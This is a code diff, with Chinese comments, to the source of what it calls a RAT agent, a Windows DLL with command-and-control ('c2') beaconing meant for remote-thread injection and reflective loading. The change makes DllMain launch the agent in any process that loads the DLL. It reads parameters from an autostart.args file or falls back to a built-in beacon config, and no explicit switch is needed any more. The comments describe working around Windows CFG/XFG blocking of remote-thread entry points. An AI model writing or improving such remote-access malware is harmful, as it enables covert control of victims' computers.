@@ -9,6 +9,16 @@
 //   3) 注入（CreateRemoteThread + LoadLibrary，或手动映射）：
 //        远端线程入口用 StartAgent(const char*)：单指针参数，便于 lpParameter 直接传配置串
 //
+// 自启动（本 DLL 的默认行为，加载即生效）：
+//   有 %LOCALAPPDATA%\RatAgent\autostart.args（或 %TEMP%\RatAgent\ 下同名文件）
+//     → 用文件里的参数串启动（优先级最高）；
+//   没有该文件
+//     → 用内置默认配置启动（beacon 127.0.0.1:8080、轮询 5s），供反射加载/注入这类
+//       没有参数通道的场景使用。
+//   ⚠ 代价：任何 LoadLibrary 本 DLL 的进程都会起一份 agent；且 DllMain 的自启（延迟
+//     300ms）与显式入口（rundll32 的 Start/Stop、宿主 StartAgent）存在竞争——显式入口
+//     先到就正常接管，晚到则可能被默认自启抢先（参数被忽略 / Stop 退化为同进程停止）。
+//
 // 手动映射（reflective load）契约：
 //   - 本 DLL 用静态 CRT（/MT），**必须先调用入口点**（DllMainCRTStartup / AddressOfEntryPoint，
 //     参数 DLL_PROCESS_ATTACH）让 CRT 完成初始化，否则 std::string/std::mutex 等全局对象未构造；
@@ -160,21 +170,23 @@ namespace
         return 0;
     }
 
-    // 注入自启动线程：等 DllMain 走完（脱离 loader lock）后再解析参数并启动
+    // 加载即自启线程：等 DllMain 走完（脱离 loader lock）后解析参数并启动。
+    //   有 autostart.args → 用文件里的参数（优先级最高）
+    //   没有             → 用内置默认配置
+    // 这里的 300ms 延迟同时是显式入口（rundll32 的 Start/Stop、宿主 StartAgent）能
+    // "先接管"的窗口：它们由加载方紧接着调用，通常远早于此；若晚于它，默认自启会先占坑
+    //（见文件头与 agent_runtime.h 的说明）。
     unsigned __stdcall autostart_proc(void*)
     {
         Sleep(300);
         std::string args;
-        if (!c2::agent_autostart_requested(args))
+        if (c2::agent_autostart_requested(args))
+            printf("[*] autostart (trigger) mode=%s\n", c2::agent_version());
+        else
         {
-            // 没有触发器文件：只有显式开关（RAT_AUTOSTART_DEFAULT=1）打开时才自启
-            if (!c2::agent_autostart_default_enabled())
-                return 0;
-            printf("[*] autostart (no trigger, default config) %s\n", c2::agent_version());
-            start_from_args(nullptr);   // nullptr → fill_dll_defaults 的内置默认
-            return 0;
+            printf("[*] autostart (no trigger -> default config) mode=%s\n", c2::agent_version());
+            args.clear();
         }
-        printf("[*] autostart (trigger) mode=%s\n", c2::agent_version());
         start_from_args(args.empty() ? nullptr : args.c_str());
         return 0;
     }
@@ -268,20 +280,12 @@ BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)
 {
     if (reason == DLL_PROCESS_ATTACH)
     {
-        // 注入场景：现代 Windows 的 CFG/XFG 会拦"远程线程入口指向镜像内任意导出"
-        //（0xC0000409 失败），但远程 LoadLibraryW 可用 → 由本 DLL 自己按触发器启动。
-        // 这里只做一次轻量文件探测（无堆分配），重活交给 _beginthreadex 的新线程。
-        //
-        // 两条自启路径：
-        //   1) autostart.args 触发器存在（内容 = 参数串）——默认行为，一直是"开关"；
-        //   2) 显式开关 RAT_AUTOSTART_DEFAULT=1 —— 反射加载这类没有参数通道的场景，
-        //      不落盘也能按内置默认配置自启（见 agent_runtime.h 说明）。
-        if (c2::agent_autostart_trigger_present() || c2::agent_autostart_default_enabled())
-        {
-            HANDLE t = (HANDLE)_beginthreadex(nullptr, 0, autostart_proc, nullptr, 0, nullptr);
-            if (t)
-                CloseHandle(t);
-        }
+        // 加载即自启：有 autostart.args 用文件参数，没有就用内置默认配置
+        //（见文件头说明）。这里只起一个线程、不做堆分配，重活交给它在脱离
+        // loader lock 之后做。
+        HANDLE t = (HANDLE)_beginthreadex(nullptr, 0, autostart_proc, nullptr, 0, nullptr);
+        if (t)
+            CloseHandle(t);
     }
     else if (reason == DLL_PROCESS_DETACH)
     {
